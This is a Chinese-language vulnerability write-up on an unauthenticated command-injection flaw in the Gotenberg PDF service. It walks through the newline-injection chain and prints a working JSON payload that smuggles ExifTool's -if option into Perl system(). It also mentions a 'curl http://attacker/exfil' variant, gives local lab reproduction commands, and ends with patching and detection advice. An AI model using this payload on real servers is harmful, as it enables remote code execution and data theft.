#  一条 HTTP 请求就能 RCE，你部署的 PDF 转换服务可能正在裸奔  
Red Hunter
                    Red Hunter  黑白之道   2026-10-08 01:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6OTj4dOHiaAGDU5edNQVxYicBZ4RzPh5ZbE28etqHLvvC0FO9TmXOcNdz08RwguHK0xDrp3qWvbQ2wJnrUWqD7tkb7YT708F3zjw/640?from=appmsg "")  
> **导语**  
：@0xManan 周末丢出一条价值 CVSS 9.8 的 RCE——Docker PDF 转换服务 Gotenberg（很多技术栈"安静地"依赖它做发票/合同转 PDF）≤ 8.30.1 的 /forms/pdfengines/metadata/write  
 端点未鉴权，把用户控制的 JSON metadata key 直接转给 ExifTool。攻击者在 key 里塞换行符切断 ExifTool 的 stdin，再走私一个 -if system('…')||1  
 参数触发 Perl eval。一条 HTTP 请求搞定 RCE，响应是干净的 200 + 合法 PDF，你的监控只看到"一次成功转换"。  
  
## 一、漏洞概况  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">项目</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">内容</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVE 编号</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVE-2026-42589（同一利用链的姐妹 CVE：CVE-2026-40281，CVSS 10.0）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CVSS 评分</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">9.8（Critical）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">漏洞类型</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CWE-78 命令注入 / CWE-77 参数注入</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">影响产品</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Gotenberg（Docker PDF/HTML 转换 API）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">影响版本</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">≤ 8.30.1（8.30.1 修复不彻底，仍可绕过）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">修复版本</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">8.31.0</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">攻击前提</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">无需鉴权，单条 HTTP 请求</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">攻击后果</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">以容器用户身份执行任意命令</span></section></td></tr></tbody></table>  
Gotenberg 在很多技术栈里默默存在——Paperless-ngx、Nextcloud、Documenso、企业内部文档流水线都直接调用它的 HTTP API 做格式转换。它一旦暴露在公网或被内网穿透，攻击面直接顶到 RCE。  
## 二、攻击链解析  
  
完整利用链只分四步：  
  
**Step 1：未鉴权访问 metadata 写入端点**  
  
Gotenberg 的 POST /forms/pdfengines/metadata/write  
 端点允许**任何调用方**  
传一个 PDF 文件 + 一个 metadata JSON 对象，把 metadata 写到 PDF 里。这个端点**没有鉴权要求**  
，正常业务里大量调用。  
  
**Step 2：在 JSON metadata key 里塞 \n**  
  
Gotenberg 把用户提交的 metadata JSON 直接转给 ExifTool 作为命令行参数。ExifTool 用 Perl 写的命令行工具，它的 stdin/参数处理逻辑里**没有拒绝控制字符**  
。攻击者构造这样的 JSON：  
```
{"Title\n-if\nsystem('sleep 6')||1\n-Comment":"x"}
```  
  
JSON 解析器把 \n  
 当作换行字符面值；ExifTool 拿到的命令行实际被切成多段：  
```
exiftool -Title-ifsystem('sleep 6')||1-Comment=x input.pdf
```  
  
-if  
 是 ExifTool 的**条件执行参数**  
，后面跟 Perl 表达式；system('sleep 6')||1  
 是任意 Perl 代码——system()  
 执行 shell 命令，||1  
 保证返回值是 truthy，让 ExifTool 不报错继续往下走。  
  
**Step 3：Perl eval 触发 RCE**  
  
ExifTool 把 -if  
 后面的字符串丢给 Perl 解释器，Perl 立即执行 system('sleep 6')  
，命令以**Gotenberg 容器进程用户身份**  
跑出来——根据 Gotenberg 8.x 默认配置，这通常是 root（Group 0）。  
  
**Step 4：响应伪装**  
  
nuclei 模板验证时用 sleep 6  
 让响应延迟触发——6 秒后 Gotenberg 返回 HTTP 500（内部错误但已执行命令）。如果换成 curl http://attacker/exfil?...  
 之类的命令，HTTP 响应反而是 200 + 合法 PDF（命令异步执行不阻塞），监控日志只看到"一次成功转换"。  
  
![Gotenberg CVE-2026-42589 利用流程图](https://mmbiz.qpic.cn/mmbiz_png/nGzNudUIJ6OiaOfZc2ib3Zzxvkhotf8icIUic2aBoN23FteKN39ibZPg0DrhSg53VJ3rOxhtqFQg97eF2ohxfMarpCjzibHQiaSbRaSg6SpuH7IUyo/640?from=appmsg "Gotenberg CVE-2026-42589 利用流程图")  
## 三、PoC 复现  
  
安全研究员 fineman999 在 GitHub 开源了完整 PoC 实验室——本地用 Docker Compose 起 Gotenberg 8.29.1（含漏洞版本）和 8.31.0（修复版本），跑 nuclei 模板做对比验证。仓库结构：  
```
POC_CVE-2026-42589/├── docker-compose.yml          # 起 8.29.1（漏洞版）├── docker-compose.latest.yml   # 起 8.31.0（修复版）├── CVE-2026-42589.yaml         # nuclei 模板├── manual_verify.py            # Python 手动验证脚本├── sample.pdf                  # 内置测试 PDF└── README.md
```  
  
**复现步骤（本地 lab）**  
：  
```
# 1. clone 仓库git clone https://github.com/fineman999/POC_CVE-2026-42589cd POC_CVE-2026-42589# 2. 起漏洞版 Gotenbergdocker compose up -d# 3. 验证版本curl -s http://127.0.0.1:3000/version# 期望输出：8.29.1# 4. 跑 nuclei 模板nuclei -duc -u http://127.0.0.1:3000 -t CVE-2026-42589.yaml# 漏洞版：match after 6s delay → 命中# 修复版：no match → 立即拒绝
```  
  
PoC 故意用 sleep 6  
 而不是反弹 shell，**避免任何破坏性副作用**  
——只验证时序差异，确认利用链可重现。  
## 四、修复方案  
  
**立即修复**  
（Gotenberg 侧）：  
- 升级到 **8.31.0**  
 或更高版本  
  
- 升级前临时缓解：在 Gotenberg 前加 API 网关或 reverse proxy 做鉴权（API_KEY），拦截未授权调用  
  
- 临时缓解：删除 metadata/write  
 端点的暴露，或限制只允许内部网络访问  
  
**侧修复**  
（调用方侧）：  
- 检查你的应用代码里有没有直接以 http://gotenberg:3000/forms/pdfengines/metadata/write  
 形式访问的硬编码——给它套一层内部 API 鉴权  
  
- 监控日志里过滤 exiftool  
 子进程异常派生（sh  
、perl  
、curl  
、wget  
）的告警  
  
**架构层建议**  
：  
- PDF 元数据写入**不应该**  
走 ExifTool 命令行——用 ExifTool 的 Perl 模块 API（避开命令行参数解析），或换 PDF-Tools/PyPDF 这种内存操作库  
  
- 所有容器化的"工具栈"服务（PDF、图像、视频、文档转换）默认要鉴权，不能假设它们只在内部网络  
  
## 五、检测建议  
  
按 @vuln_tracker 在推文回复里给的蓝队视角：  
- **进程行为告警**  
——Gotenberg 容器内 exiftool  
 进程派生 sh  
、perl  
、curl  
、wget  
、bash  
 等子进程 → 立即告警  
  
- **进程组检查**  
——Gotenberg 默认以 Group 0 (root) 跑，监控这个进程组能写到哪些敏感路径（/etc/shadow  
、/proc/self/...  
、容器挂载点）  
  
- **网络出口**  
——容器内异常向外网发起 HTTP/TCP 连接，典型反连场景  
  
- **API 入口限速**  
——同一 IP 短时间内反复调 /forms/pdfengines/metadata/write  
，可能是探测或攻击  
  
## 六、思考题  
1. 8.30.1 修复"只 sanitized keys"，而 40281 通过 metadata values 同样能 RCE——为什么 metadata key 和 metadata value 的处理不能复用同一套 sanitization 逻辑？ExifTool 在两种位置处理上有差异吗？  
  
1. nuclei 模板用 sleep 6  
 检测而非反弹 shell，这种 oastless（无带外）检测的优势和盲区是什么？  
  
1. Gotenberg 默认以 root 在容器里跑，给"PDF 转换"这类工具容器 root 权限合理吗？容器化的工具栈应该如何做权限隔离？  
  
## 七、附录：PoC 与参考资料  
  
按用户要求本节提供完整下载/参考入口，clone 后按 README 指引本地复现：  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">资源</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">地址</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><strong><span leaf="">PoC 仓库（主）</span></strong></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">https://github.com/fineman999/POC_CVE-2026-42589</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">GitHub 官方 Advisory</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">https://github.com/gotenberg/gotenberg/security/advisories/GHSA-rqgh-gxv4-6657</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Gotenberg 8.31.0 Release</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">ExifTool 官方文档</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">https://exiftool.org/exiftool_pod.html</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">原始推文（@0xManan）</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">https://x.com/0xManan/status/2107741652102312302</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">蓝队回复（@vuln_tracker）</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">https://x.com/vuln_tracker/status/2107774179021873553</span></section></td></tr></tbody></table>  
**复现命令速查**  
：  
```
git clone https://github.com/fineman999/POC_CVE-2026-42589cd POC_CVE-2026-42589docker compose up -d           # 起漏洞版 8.29.1curl -s http://127.0.0.1:3000/version   # 验证版本nuclei -duc -u http://127.0.0.1:3000 -t CVE-2026-42589.yaml
```  
  
如需对比修复版，切到 docker-compose.latest.yml  
 跑同一套 nuclei。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6MU3vibUxDkqAeobRBg2hozzWLSD8uAXLCVAJ3EDtibd8EqXELTHbFQzGSkJkuMIKiaKaCYPpicNCsbFokdcPiaaFnF2kS54SwNPv3Q/640?from=appmsg "")  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  
